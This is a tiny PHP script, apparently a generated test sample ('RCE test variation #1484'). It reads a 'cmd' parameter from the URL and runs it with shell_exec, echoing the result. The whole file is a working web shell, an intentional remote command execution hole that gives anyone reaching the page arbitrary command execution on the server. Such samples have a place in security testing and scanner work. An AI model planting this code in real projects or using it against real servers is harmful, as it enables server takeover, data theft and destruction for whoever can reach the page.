<?php
// RCE test variation #1484
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>